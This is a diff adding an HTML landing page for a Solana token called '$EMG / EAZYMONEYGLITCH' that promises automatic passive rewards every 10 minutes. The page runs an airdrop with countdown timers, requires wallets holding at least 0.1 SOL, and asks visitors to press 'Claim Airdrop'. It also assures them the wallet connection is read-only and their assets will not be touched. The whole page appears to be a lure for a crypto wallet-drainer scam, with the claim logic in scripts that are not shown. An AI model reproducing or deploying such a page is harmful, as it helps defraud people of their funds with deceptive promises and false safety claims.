@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <script type="module" src="index.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Title and Favicon -->
+    <title>EAZYMONEYGLITCH | $EMG Token</title>
+    <link rel="icon" type="image/jpeg" href="logo.jpg">
+    
+    <!-- SEO Meta Tags -->
+    <meta name="description" content="$EMG - The first token to offer automatic passive rewards every 10 minutes. Join the future of DeFi with EAZYMONEYGLITCH.">
+    <meta name="keywords" content="EMG, EAZYMONEYGLITCH, crypto, DeFi, passive income, rewards token, blockchain">
+    <meta name="author" content="EAZYMONEYGLITCH">
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://emg-token.vercel.app/">
+    <meta property="og:title" content="EAZYMONEYGLITCH | $EMG Token">
+    <meta property="og:description" content="Earn passive rewards every 10 minutes with $EMG - The revolutionary DeFi token">
+    <meta property="og:image" content="https://emg-token.vercel.app/logo.jpg">
+    
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://emg-token.vercel.app/">
+    <meta property="twitter:title" content="EAZYMONEYGLITCH | $EMG Token">
+    <meta property="twitter:description" content="Earn passive rewards every 10 minutes with $EMG - The revolutionary DeFi token">
+    <meta property="twitter:image" content="https://emg-token.vercel.app/logo.jpg">
+    
+    <!-- Telegram -->
+    <meta property="telegram:channel" content="@EAZYMONEYGLITCH">
+    <meta property="telegram:title" content="EAZYMONEYGLITCH | $EMG Token">
+    <meta property="telegram:description" content="🚀 First token to offer automatic rewards every 10 minutes! Join our community and earn passive income with $EMG">
+    <meta property="telegram:image" content="https://emg-token.vercel.app/logo.jpg">
+    
+    <!-- Theme Color for Mobile Browsers -->
+    <meta name="theme-color" content="#000000">
+    
+    <!-- Existing stylesheets -->
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Arimo:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="app">
+        <canvas id="bg-canvas" class="animated-background"></canvas>
+        <main>
+            <section class="hero">
+                <img src="logo.jpg" alt="EMG Logo" class="hero-logo">
+                <p class="subtitle">Earn Passive Rewards Every 10 Minutes</p>
+            </section>
+
+            <section class="info-boxes">
+                <div class="info-box">
+                    <h3>Revolutionary Passive Income</h3>
+                    <p>$EMG is pioneering the future of DeFi rewards, being the first token to offer automatic rewards every 10 minutes to all holders without any staking requirements.</p>
+                </div>
+                <div class="info-box">
+                    <h3>Join Our Community</h3>
+                    <p>Be part of our growing community of investors and enthusiasts. Join us on Telegram to stay updated and connect with fellow holders.</p>
+                    <a href="https://t.me/EAZYMONEYGLITCH" target="_blank" class="telegram-link">@EAZYMONEYGLITCH</a>
+                </div>
+                <div class="info-box">
+                    <h3>Secure & Transparent</h3>
+                    <p>Built with advanced blockchain technology, $EMG ensures complete transparency in reward distribution while maintaining the highest security standards for all holders.</p>
+                </div>
+            </section>
+
+            <div class="scroll-arrow">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+
+            <section class="about">
+                <h2 class="glow-text">What is $EMG?</h2>
+                <div class="features">
+                    <div class="feature-card">
+                        <h3>Automatic Rewards</h3>
+                        <p>Earn passive income every 10 minutes just by holding $EMG tokens</p>
+                    </div>
+                    <div class="feature-card">
+                        <h3>Community Driven</h3>
+                        <p>Join a vibrant community of holders and believers in the future of DeFi</p>
+                    </div>
+                    <div class="feature-card">
+                        <h3>Secure & Reliable</h3>
+                        <p>Built on blockchain technology ensuring transparency and security</p>
+                    </div>
+                </div>
+            </section>
+
+            <section class="airdrop" id="airdrop">
+                <h2 class="glow-text">$EMG Airdrop</h2>
+                <p>Don't miss out on your chance to claim free $EMG tokens!</p>
+                
+                <div class="launch-info">
+                    <h3>🚀 Token Launch Information</h3>
+                    <p>We are currently gathering active wallets for our upcoming token distribution. All eligible wallets that claim before the countdown ends will receive $EMG tokens when we launch in approximately one week.</p>
+                    <div class="countdown-container">
+                        <p>Token Distribution Begins In:</p>
+                        <div id="launch-countdown" class="countdown-timer">
+                            <div class="countdown-item">
+                                <span id="days">00</span>
+                                <label>Days</label>
+                            </div>
+                            <div class="countdown-item">
+                                <span id="hours">00</span>
+                                <label>Hours</label>
+                            </div>
+                            <div class="countdown-item">
+                                <span id="minutes">00</span>
+                                <label>Minutes</label>
+                            </div>
+                            <div class="countdown-item">
+                                <span id="seconds">00</span>
+                                <label>Seconds</label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="requirements">
+                    <h3>Eligibility Requirements:</h3>
+                    <ul>
+                        <li>Wallet age must be older than 1 day</li>
+                        <li>Minimum 5 transactions on wallet</li>
+                        <li>Minimum balance of 0.1 SOL</li>
+                    </ul>
+                </div>
+
+                <div class="safety-notice">
+                    <h3>🔒 Safe Claiming Process</h3>
+                    <p>This is a read-only connection to verify your eligibility. Your assets will not be touched or accessed during this process.</p>
+                </div>
+
+                <button class="claim-btn claim-button">Claim Airdrop</button>
+                <div class="timer">
+                    <p>Airdrop ends in: <span id="countdown">00:00:00</span></p>
+                </div>
+            </section>
+        </main>
+
+        <footer>
+            <div class="social-links">
+                <a href="https://t.me/EAZYMONEYGLITCH" target="_blank" class="glow-text">Join us on Telegram</a>
+            </div>
+        </footer>
+
+        <div class="notifications-container"></div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html> 
